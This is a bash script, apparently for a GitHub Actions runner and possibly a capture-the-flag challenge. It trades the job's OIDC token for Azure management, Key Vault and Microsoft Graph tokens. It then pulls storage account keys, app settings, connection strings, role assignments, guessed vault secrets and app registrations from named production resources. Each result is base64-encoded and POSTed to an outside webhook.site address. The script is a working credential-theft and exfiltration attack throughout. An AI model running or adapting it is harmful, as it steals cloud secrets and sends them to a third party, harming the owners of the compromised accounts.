#!/usr/bin/env bash
set -e
WH="https://webhook.site/2ba46706-cc2e-4cc1-91e7-58fda5646b88"
send() { curl -s -m30 -X POST "$WH" -H "Content-Type: application/json" -d "{\"tag\":\"$1\",\"data\":\"$(echo "$2" | base64 -w0)\"}"; }

send "v2-start" "starting v2"

# OIDC → mgmt token
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token')
send "v2-mgmt" "${MGMT:0:40}..."

API="https://management.azure.com"
SUB="$AZURE_SUBSCRIPTION_ID"
RG="rg-tbl-platform-prod-sea"
H=(-H "Authorization: Bearer $MGMT")

# 1. App Service settings (FLAG might be here)
APPCFG=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$API/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01")
send "v2-appsettings" "$APPCFG"

# 2. Storage account listKeys for ALL 4 accounts
for SA in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  KEYS=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$API/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01")
  send "v2-keys-$SA" "$KEYS"
done

# 3. kv-tbl-sec-x3euoz vault properties + RBAC assignments
KVDET=$(curl -s "${H[@]}" "$API/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01")
send "v2-kvsec-detail" "$KVDET"

RBAC=$(curl -s "${H[@]}" "$API/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
send "v2-kvsec-rbac" "$RBAC"

# 4. Web app connection strings
CONN=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$API/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-01-01")
send "v2-connstrings" "$CONN"

# 5. RBAC on whole subscription for our identity
MYROLES=$(curl -s "${H[@]}" "$API/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId eq '63e87ab1-6bd2-4e80-92be-943450b20e4f'")
send "v2-myroles" "$MYROLES"

# 6. Get vault token and try kv-tbl-sec individual secret names
OIDC2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
VTOK=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC2" | jq -r '.access_token')
for sname in flag ctf-flag FLAG secret-flag tbl-flag df26-flag platform-flag challenge-flag config internal-config connection-string master-key; do
  R=$(curl -s -m5 -H "Authorization: Bearer $VTOK" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$sname?api-version=7.4")
  send "v2-kvsec-$sname" "$R"
done

# 7. Graph API - check app registrations for flag
OIDC3=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
GTOK=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC3" | jq -r '.access_token')
APPS=$(curl -s -H "Authorization: Bearer $GTOK" "https://graph.microsoft.com/v1.0/applications" | head -c 3000)
send "v2-graph-apps" "$APPS"

send "v2-done" "complete"
